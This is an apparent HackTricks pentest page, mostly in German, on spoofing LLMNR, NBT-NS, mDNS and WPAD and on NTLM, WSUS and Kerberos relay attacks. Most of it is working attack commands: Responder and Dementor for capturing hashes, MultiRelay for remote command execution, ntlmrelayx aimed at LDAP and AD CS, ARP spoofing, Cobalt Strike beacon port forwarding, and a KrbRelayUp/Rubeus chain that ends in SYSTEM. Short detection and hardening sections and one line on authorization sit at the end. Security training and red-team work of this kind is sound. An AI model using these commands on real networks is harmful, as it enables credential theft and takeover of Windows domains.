# Spoofing LLMNR, NBT-NS, mDNS/DNS and WPAD and Relay Attacks

{{#include ../../banners/hacktricks-training.md}}

## Netzwerkprotokolle

### Protokolle zur lokalen Hostauflösung

- **LLMNR, NBT-NS, and mDNS**:
- Microsoft und andere Betriebssysteme verwenden LLMNR und NBT-NS zur lokalen Namensauflösung, wenn DNS fehlschlägt. Ebenso verwenden Apple- und Linux-Systeme mDNS.
- Diese Protokolle sind aufgrund ihrer nicht authentifizierten Broadcast-Natur über UDP anfällig für Abfangen und spoofing.
- [Responder](https://github.com/lgandx/Responder) und [Dementor](https://github.com/MatrixEditor/Dementor) können verwendet werden, um Dienste zu impersonifizieren, indem gefälschte Antworten an Hosts gesendet werden, die diese Protokolle abfragen.
- Weitere Informationen zur Dienst-Impersonation mit Responder finden Sie [here](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### Web Proxy Auto-Discovery Protocol (WPAD)

- WPAD erlaubt Browsern, Proxy-Einstellungen automatisch zu entdecken.
- Die Erkennung erfolgt über DHCP, DNS oder fällt auf LLMNR und NBT-NS zurück, wenn DNS fehlschlägt.
- Responder kann WPAD-Angriffe automatisieren und Clients auf bösartige WPAD-Server umleiten.

### Responder/Dementor for Protocol Poisoning

- **Responder** ist ein Tool, das zum Poisoning von LLMNR-, NBT-NS- und mDNS-Abfragen verwendet wird, und selektiv je nach Anfrage-Typ antwortet, mit Schwerpunkt auf SMB-Services.
- Es ist in Kali Linux vorinstalliert und unter `/etc/responder/Responder.conf` konfigurierbar.
- Responder zeigt gefangene Hashes auf dem Bildschirm an und speichert sie im Verzeichnis `/usr/share/responder/logs`.
- Es unterstützt sowohl IPv4 als auch IPv6.
- Eine Windows-Version von Responder ist [here](https://github.com/lgandx/Responder-Windows) verfügbar.

- **Dementor** erweitert die Themen Multicast-Poisoning und fungiert zusätzlich als rogue service provider (inklusive CUPS RCE-Unterstützung)
- Die Gesamtstruktur ähnelt **Responder**, bietet jedoch granularere Konfigurationsmöglichkeiten. (Standard befindet sich hier: [Dementor.toml](https://github.com/MatrixEditor/dementor/blob/master/dementor/assets/Dementor.toml))
- Kompatibilität zwischen **Dementor** und **Responder** ist hier: [Compatibility Matrix](https://matrixeditor.github.io/dementor/compat.html)
- Intro und Dokumentation: [Dementor - Docs](https://matrixeditor.github.io/dementor/intro.html)
- Behebt Capture-Probleme, die durch Responder bei bestimmten Protokollen eingeführt wurden

#### Responder ausführen

- Um Responder mit den Standard-Einstellungen zu starten: `responder -I <Interface>`
- Für aggressiveres Probing (mit möglichen Nebenwirkungen): `responder -I <Interface> -P -r -v`
- Techniken zum Erfassen von NTLMv1 challenges/responses für einfacheres cracking: `responder -I <Interface> --lm --disable-ess`
- WPAD impersonation kann aktiviert werden mit: `responder -I <Interface> --wpad`
- NetBIOS-Anfragen können auf die Angreifer-IP aufgelöst werden, und ein Authentication-Proxy kann eingerichtet werden: `responder.py -I <interface> -Pv`

#### Dementor ausführen

- Mit Standard-Einstellungen: `Dementor -I <interface>`
- Mit Standard-Einstellungen im Analyse-Modus: `Dementor -I <interface> -A`
- Automatisches NTLM-Session-Downgrade (ESS): `Dementor -I <interface> -O NTLM.ExtendedSessionSecurity=Off`
- Aktuelle Session mit benutzerdefinierter Konfig ausführen: `Dementor -I <interface> --config <file.toml>`

### DHCP Poisoning mit Responder

- Das Spoofing von DHCP-Antworten kann die Routing-Informationen eines Opfers dauerhaft vergiften und stellt eine unauffälligere Alternative zu ARP Poisoning dar.
- Es erfordert präzise Kenntnis der Konfiguration des Zielnetzwerks.
- Angriff ausführen: `./Responder.py -I eth0 -Pdv`
- Diese Methode kann effektiv NTLMv1/2-Hashes erfassen, erfordert jedoch sorgfältige Handhabung, um Netzwerkstörungen zu vermeiden.

### Erfassen von Credentials mit Responder/Dementor

- Responder/Dementor geben sich als Dienste aus, die die oben genannten Protokolle verwenden, und erfassen credentials (in der Regel NTLMv2 Challenge/Response), wenn ein Benutzer versucht, sich gegen die gefälschten Dienste zu authentifizieren.
- Es können Versuche unternommen werden, auf NetNTLMv1 downzugraden oder ESS zu deaktivieren, um das Cracking der credentials zu erleichtern.

If you already have a **writable SMB share that victims browse**, you can coerce outbound SMB without spoofing by planting UNC-based lure files (SCF/LNK/library-ms/desktop.ini/Office) generated with ntlm_theft, then catching the authentication with Responder. See the [Explorer-triggered UNC lure workflow](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md#writable-smb-share--explorer-triggered-unc-lures-ntlm_theftscflnklibrary-msdesktopini).

Es ist wichtig zu beachten, dass der Einsatz dieser Techniken legal und ethisch erfolgen muss, mit entsprechender Autorisierung, um Störungen oder unbefugten Zugriff zu vermeiden.

## Inveigh

Inveigh ist ein Tool für penetration testers und red teamers, entwickelt für Windows-Systeme. Es bietet ähnliche Funktionalitäten wie Responder und führt spoofing- und man-in-the-middle-Angriffe durch. Das Tool hat sich von einem PowerShell-Skript zu einem C#-Binary entwickelt, mit [**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) und [**InveighZero**](https://github.com/Kevin-Robertson/InveighZero) als den Hauptversionen. Detaillierte Parameter und Anweisungen finden sich im [**wiki**](https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters).

Inveigh kann über PowerShell betrieben werden:
```bash
Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y
```
Oder als C# binary ausgeführt:
```bash
Inveigh.exe
```
### NTLM Relay Attack

Dieser Angriff nutzt SMB-Authentifizierungssitzungen, um auf eine Zielmaschine zuzugreifen und im Erfolgsfall eine system shell zu erhalten. Wichtige Voraussetzungen sind:

- Der authentifizierende Benutzer muss Local Admin access auf dem relayed host haben.
- SMB signing sollte deaktiviert sein.

#### 445 Port Forwarding and Tunneling

In Szenarien, in denen ein direkter Netzwerkzugang nicht möglich ist, muss der Traffic auf Port 445 weitergeleitet und getunnelt werden. Tools wie [**PortBender**](https://github.com/praetorian-inc/PortBender) helfen dabei, Port-445-Traffic auf einen anderen Port umzuleiten, was entscheidend ist, wenn Local Admin access zum Laden eines Treibers vorhanden ist.

PortBender setup and operation in Cobalt Strike:
```bash
Cobalt Strike -> Script Manager -> Load (Select PortBender.cna)

beacon> cd C:\Windows\system32\drivers # Navigate to drivers directory
beacon> upload C:\PortBender\WinDivert64.sys # Upload driver
beacon> PortBender redirect 445 8445 # Redirect traffic from port 445 to 8445
beacon> rportfwd 8445 127.0.0.1 445 # Route traffic from port 8445 to Team Server
beacon> socks 1080 # Establish a SOCKS proxy on port 1080

# Termination commands
beacon> jobs
beacon> jobkill 0
beacon> rportfwd stop 8445
beacon> socks stop
```
### Weitere Tools für NTLM Relay Attack

- **Metasploit**: Einrichten mit proxies sowie Angaben zu lokalen und entfernten Hosts.
- **smbrelayx**: Ein Python-Skript zum Weiterleiten von SMB-Sitzungen und zum Ausführen von Befehlen oder zur Installation von Backdoors.
- **MultiRelay**: Ein Tool aus der Responder-Suite, um bestimmte Benutzer oder alle Benutzer weiterzuleiten, Befehle auszuführen oder Hashes zu dumpen.

Jedes Tool kann bei Bedarf so konfiguriert werden, dass es über einen SOCKS proxy läuft, wodurch Angriffe selbst bei indirektem Netzwerkzugang möglich sind.

### MultiRelay-Betrieb

MultiRelay wird aus dem _**/usr/share/responder/tools**_ Verzeichnis ausgeführt und richtet sich gegen bestimmte IPs oder Benutzer.
```bash
python MultiRelay.py -t <IP target> -u ALL # Relay all users
python MultiRelay.py -t <IP target> -u ALL -c whoami # Execute command
python MultiRelay.py -t <IP target> -u ALL -d # Dump hashes

# Proxychains for routing traffic
```
### RelayKing – Erkennung relay-fähiger Ziele und kuratierte Relay-Listen

RelayKing ist ein NTLM-Relay **Audittool**, das ermittelt, wo Relays möglich sind, und einsatzbereite Ziellisten für `ntlmrelayx.py -tf` erzeugt. Es prüft die Protokollhärtung (SMB signing/channel binding; HTTP/HTTPS/MSSQL/LDAP/LDAPS EPA/CBT; RPC auth) und markiert **Coercion-/Reflection-Hilfen** (PetitPotam/PrinterBug/DFSCoerce, WebClient/WebDAV, NTLMv1, CVE-2025-33073 reflection).

- Auth verbessert die Zuverlässigkeit bei HTTPS/LDAPS CBT- und MSSQL EPA-Prüfungen; SMB signing/signature level wird ohne Authentifizierung geprüft.
- Cross-protocol Relay-Pfade nutzen bestätigte Net-NTLMv1 (`--ntlmv1`/`--ntlmv1-all`) Treffer; für jeden Pfad wird eine Schweregrad-Einstufung angegeben.
- `--gen-relay-list <file>` schreibt eine grep-freundliche Zielliste für `ntlmrelayx.py -tf <file>`, um Versuch-und-Irrtum zu vermeiden.
- `--coerce-all` löst massenhaft PetitPotam/DFSCoerce/PrinterBug gegen alle Ziele aus; `--ntlmv1-all` (RemoteRegistry) und `--audit` (domainweite LDAP-Host-Abfrage) sind **auffällig** und erzeugen viele Anmeldungen/Remotezugriffe.
- `--proto-portscan` beschleunigt das Scannen, indem geschlossene Ports übersprungen werden; `--krb-dc-only` hilft, wenn DCs NTLM blockieren, andere Dienste es aber weiterhin annehmen.

Beispielscans:
```bash
# Authenticated audit across multiple protocols + generate relay list for ntlmrelayx
python3 relayking.py -u lowpriv -p 'P@ssw0rd!' -d lab.local --dc-ip 10.0.0.10 \
--audit --protocols smb,ldap,ldaps,mssql,http,https --proto-portscan --ntlmv1 \
--threads 10 -vv -o plaintext,json --output-file relayking-scan --gen-relay-list relaytargets.txt

# Unauthenticated CIDR sweep for SMB/LDAP/HTTP relayability
python3 relayking.py --null-auth --protocols smb,ldap,http --proto-portscan -o plaintext 10.10.0.0/24
```
Diese Tools und Techniken bilden eine umfassende Sammlung zur Durchführung von NTLM Relay-Angriffen in verschiedenen Netzwerkumgebungen.

### Abusing WSUS HTTP (8530) for NTLM Relay to LDAP/SMB/AD CS (ESC8)

WSUS-Clients authentifizieren sich gegenüber ihrem Update-Server mit NTLM über HTTP (8530) oder HTTPS (8531). Wenn HTTP aktiviert ist, können periodische Client-Check-ins im lokalen Segment erzwungen oder abgefangen und mit ntlmrelayx an LDAP/LDAPS/SMB- oder AD CS-HTTP-Endpunkte (ESC8) weitergereicht werden, ohne Hashes knacken zu müssen. Das fügt sich in normalen Update-Verkehr ein und führt häufig zu Maschinenkonto-Authentifizierungen (HOST$).

What to look for
- GPO/Registry-Konfiguration unter HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate und ...\WindowsUpdate\AU:
- WUServer (z. B. http://wsus.domain.local:8530)
- WUStatusServer (Reporting-URL)
- UseWUServer (1 = WSUS; 0 = Microsoft Update)
- DetectionFrequencyEnabled und DetectionFrequency (Stunden)
- WSUS SOAP-Endpunkte, die von Clients über HTTP genutzt werden:
- /ClientWebService/client.asmx (approvals)
- /ReportingWebService/reportingwebservice.asmx (status)
- Standardports: 8530/tcp (HTTP), 8531/tcp (HTTPS)

Reconnaissance
- Unauthenticated
- Scan for listeners: nmap -sSVC -Pn --open -p 8530,8531 -iL <hosts>
- Sniff HTTP WSUS traffic via L2 MITM and log active clients/endpoints with wsusniff.py (HTTP only unless you can make clients trust your TLS cert).
- Authenticated
- Parse SYSVOL GPOs for WSUS keys with MANSPIDER + regpol (wsuspider.sh wrapper summarises WUServer/WUStatusServer/UseWUServer).
- Query endpoints at scale from hosts (NetExec) or locally:
nxc smb <ip> -u <user> -p <pass> -M reg-query -o PATH="HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate" KEY="WUServer"
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate

End-to-end HTTP relay steps
1) Position for MITM (same L2) so a client resolves the WSUS server to you (ARP/DNS poisoning, Bettercap, mitm6, etc.). Example with arpspoof:
arpspoof -i <iface> -t <wsus_client_ip> <wsus_server_ip>

2) Redirect port 8530 to your relay listener (optional, convenient):
iptables -t nat -A PREROUTING -p tcp --dport 8530 -j REDIRECT --to-ports 8530
iptables -t nat -L PREROUTING --line-numbers

3) Start ntlmrelayx with the HTTP listener (requires Impacket support for HTTP listener; see PRs below):
ntlmrelayx.py -t ldap://<DC> -smb2support -socks --keep-relaying --http-port 8530

Other common targets:
- Relay to SMB (if signing off) for exec/dump: -t smb://<host>
- Relay to LDAPS for directory changes (e.g., RBCD): -t ldaps://<DC>
- Relay to AD CS web enrollment (ESC8) to mint a cert and then authenticate via Schannel/PKINIT:
ntlmrelayx.py --http-port 8530 -t http://<CA>/certsrv/certfnsh.asp --adcs --no-http-server
For deeper AD CS abuse paths and tooling, see the AD CS page:

{{#ref}}
../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md
{{#endref}}

4) Trigger a client check-in or wait for schedule. From a client:
wuauclt.exe /detectnow
or use the Windows Update UI (Check for updates).

5) Use the authenticated SOCKS sessions (if -socks) or direct relay results for post-exploitation (LDAP changes, SMB ops, or AD CS certificate issuance for later authentication).

HTTPS constraint (8531)
- Passive interception of WSUS over HTTPS is ineffective unless clients trust your certificate. Without a trusted cert or other TLS break, the NTLM handshake can’t be harvested/relayed from WSUS HTTPS traffic.

Notes
- WSUS was announced deprecated but remains widely deployed; HTTP (8530) is still common in many environments.
- Useful helpers: wsusniff.py (observe HTTP WSUS check-ins), wsuspider.sh (enumerate WUServer/WUStatusServer from GPOs), NetExec reg-query at scale.
- Impacket restored HTTP listener support for ntlmrelayx in PR #2034 (originally added in PR #913).

### Force NTLM Logins

In Windows you may be able to force some privileged accounts to authenticate to arbitrary machines. Read the following page to learn how:


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}

## Kerberos Relay attack

A Kerberos relay attack steals an AP-REQ ticket from one service and re-uses it against a second service that shares the same computer-account key (because both SPNs sit on the same `$` machine account). This works even though the SPNs’ service classes differ (e.g. `CIFS/` → `LDAP/`) because the *key* that decrypts the ticket is the machine’s NT hash, not the SPN string itself and the SPN string is not part of the signature.

Unlike NTLM relay, the hop is limited to the *same host* but, if you target a protocol that lets you write to LDAP, you can chain into **Resource-Based Constrained Delegation (RBCD)** or **AD CS enrollment** and pop **NT AUTHORITY\SYSTEM** in a single shot.

For detailed info about this attack check:

- [https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html](https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html)
- [https://decoder.cloud/2025/04/24/from-ntlm-relay-to-kerberos-relay-everything-you-need-to-know/](https://decoder.cloud/2025/04/24/from-ntlm-relay-to-kerberos-relay-everything-you-need-to-know/)

- 1. **Kerberos basics**

| Token | Purpose | Relay relevance |
|-------|---------|-----------------|
| **TGT / AS-REQ ↔ REP** | Beweist den User gegenüber dem KDC | untouched |
| **Service ticket / TGS-REQ ↔ REP** | An ein **SPN** gebunden; mit dem Schlüssel des SPN-Eigentümers verschlüsselt | interchangeable if SPNs share account |
| **AP-REQ** | Client sends `TGS` to the service | **was wir stehlen & wiederverwenden** |

* Tickets sind mit dem passwort-abgeleiteten Schlüssel des Kontos verschlüsselt, das den SPN besitzt.
* Der Authenticator innerhalb des AP-REQ hat einen 5-Minuten-Zeitstempel; ein Replay innerhalb dieses Fensters ist gültig, bis der Service-Cache ein Duplikat erkennt.
* Windows prüft selten, ob der SPN-String im Ticket mit dem Dienst übereinstimmt, den Sie ansprechen; daher wird ein Ticket für `CIFS/HOST` normalerweise auch auf `LDAP/HOST` korrekt entschlüsselt.

- 2. **What must be true to relay Kerberos**

1. **Shared key:** source and target SPNs belong to the same computer account (default on Windows servers).
2. **No channel protection:** SMB/LDAP signing off and EPA off for HTTP/LDAPS.
3. **You can intercept or coerce authentication:** LLMNR/NBNS poison, DNS spoof, **PetitPotam / DFSCoerce RPC**, fake AuthIP, rogue DCOM, etc..
4. **Ticket source not already used:** you win the race before the real packet hits or block it entirely; otherwise the server’s replay cache fires Event 4649.
5. You need to somehow be able to perform a **MitM in the communication** maybe being part of the DNSAmins group to modify the DNS of the domain or being able to change the HOST file of the victim.

### Kerberos Relay Steps

- 3.1 **Recon the host**
```powershell
# find servers where HTTP, LDAP or CIFS share the same machine account
Get-ADComputer -Filter * -Properties servicePrincipalName |
Where-Object {$_.servicePrincipalName -match '(HTTP|LDAP|CIFS)'} |
Select Name,servicePrincipalName
```
- 3.2 **Starte den Relay-Listener**

[KrbRelayUp](https://github.com/Dec0ne/KrbRelayUp)
```powershell
# one-click local SYSTEM via RBCD
.\KrbRelayUp.exe relay --spn "ldap/DC01.lab.local" --method rbcd --clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8
```
`KrbRelayUp` verpackt **KrbRelay → LDAP → RBCD → Rubeus → SCM bypass** in einer einzigen Binärdatei.

- 3.3 **Coerce Kerberos auth**
```powershell
# coerce DC to auth over SMB with DFSCoerce
.\dfscoerce.exe --target \\DC01.lab.local --listener 10.0.0.50
```
DFSCoerce veranlasst den DC, ein Kerberos `CIFS/DC01`-Ticket an uns zu senden.

- 3.4 **Relay the AP-REQ**

KrbRelay extrahiert den GSS blob aus SMB, verpackt ihn in ein LDAP bind um und leitet ihn an `ldap://DC01` weiter — die Authentifizierung gelingt, weil **derselbe Schlüssel** ihn entschlüsselt.

- 3.5 **Missbrauch von LDAP ➜ RBCD ➜ SYSTEM**
```powershell
# (auto inside KrbRelayUp) manual for clarity
New-MachineAccount -Name "FAKE01" -Password "P@ss123"
KrbRelay.exe -spn ldap/DC01 -rbcd FAKE01_SID
Rubeus s4u /user:FAKE01$ /rc4:<hash> /impersonateuser:administrator /msdsspn:HOST/DC01 /ptt
SCMUACBypass.exe
```
Du besitzt jetzt **NT AUTHORITY\SYSTEM**.


### **Weitere Pfade, die man kennen sollte**

| Vektor | Trick | Warum es wichtig ist |
|--------|-------|----------------------|
| **AuthIP / IPSec** | Bösartiger Server sendet eine **GSS-ID payload** mit beliebigem SPN; der Client baut einen AP-REQ direkt an dich | Funktioniert sogar über Subnets hinweg; machine creds standardmäßig |
| **DCOM / MSRPC** | Bösartiger OXID resolver zwingt den Client, sich an ein beliebiges SPN und Port zu authentifizieren | Reine *lokale* priv-esc; umgeht Firewall |
| **AD CS Web Enroll** | Relay machine ticket to `HTTP/CA` und ein Zertifikat erhalten, dann **PKINIT** zum Erstellen von TGTs | Umgeht LDAP signing Abwehrmechanismen |
| **Shadow Credentials** | Schreibe `msDS-KeyCredentialLink`, dann PKINIT mit gefälschtem Schlüsselpaar | Kein Hinzufügen eines Computer-Accounts nötig |

### **Fehlerbehebung**

| Fehler | Bedeutung | Behebung |
|-------|---------|-----|
| `KRB_AP_ERR_MODIFIED` | Ticket-Schlüssel ≠ Zielschlüssel | Falscher Host/SPN |
| `KRB_AP_ERR_SKEW` | Uhrzeitabweichung > 5 min | Zeit synchronisieren oder `w32tm` verwenden |
| LDAP bind fails | Signing erzwungen | AD CS-Weg verwenden oder Signing deaktivieren |
| Event 4649 spam | Dienst hat doppelten Authenticator gesehen | Blockiere oder race das Originalpaket |


### **Erkennung**

* Anstieg von **Event 4769** für `CIFS/`, `HTTP/`, `LDAP/` von derselben Quelle innerhalb von Sekunden.
* **Event 4649** auf dem Dienst deutet auf einen erkannten Replay hin.
* Kerberos-Logon von **127.0.0.1** (relay zum lokalen SCM) ist höchst verdächtig — per Sigma-Regel in den KrbRelayUp docs abbilden.
* Beobachte Änderungen an `msDS-AllowedToActOnBehalfOfOtherIdentity` oder `msDS-KeyCredentialLink` Attributen.

## **Härtung**

1. **Enforce LDAP & SMB signing + EPA** auf jedem Server erzwingen.
2. **Split SPNs** sodass HTTP nicht auf demselben Konto wie CIFS/LDAP liegt.
3. Patch coercion vectors (PetitPotam KB5005413, DFS, AuthIP).
4. Setze **`ms-DS-MachineAccountQuota = 0`** um rogue computer joins zu stoppen.
5. Alarm bei **Event 4649** und unerwarteten Loopback-Kerberos-Logons.



## References

- [HTB: Breach – Writable SMB share lures + Responder capture → NetNTLMv2 crack](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
- [https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/](https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/)
- [https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/](https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/)
- [https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)
- [WSUS Is SUS: NTLM Relay Attacks in Plain Sight (TrustedSec)](https://trustedsec.com/blog/wsus-is-sus-ntlm-relay-attacks-in-plain-sight)
- [GoSecure – Abusing WSUS to enable NTLM relaying attacks](https://gosecure.ai/blog/2021/11/22/gosecure-investigates-abusing-windows-server-update-services-wsus-to-enable-ntlm-relaying-attacks)
- [Impacket PR #2034 – Restore HTTP server in ntlmrelayx](https://github.com/fortra/impacket/pull/2034)
- [Impacket PR #913 – HTTP relay support](https://github.com/fortra/impacket/pull/913)
- [WSUScripts – wsusniff.py](https://github.com/Coontzy1/WSUScripts/blob/main/wsusniff.py)
- [WSUScripts – wsuspider.sh](https://github.com/Coontzy1/WSUScripts/blob/main/wsuspider.sh)
- [MS-WSUSOD – Windows Server Update Services: Server-to-Client Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-wsusod/e00a5e81-c600-40d9-96b5-9cab78364416)
- [Microsoft – WSUS deprecation announcement](https://techcommunity.microsoft.com/blog/windows-itpro-blog/windows-server-update-services-wsus-deprecation/4250436)
- [RelayKing v1.0](https://github.com/depthsecurity/RelayKing-Depth)
- [Depth Security – Introducing RelayKing: Relay to Royalty](https://www.depthsecurity.com/blog/introducing-relayking-relay-to-royalty/)

{{#include ../../banners/hacktricks-training.md}}
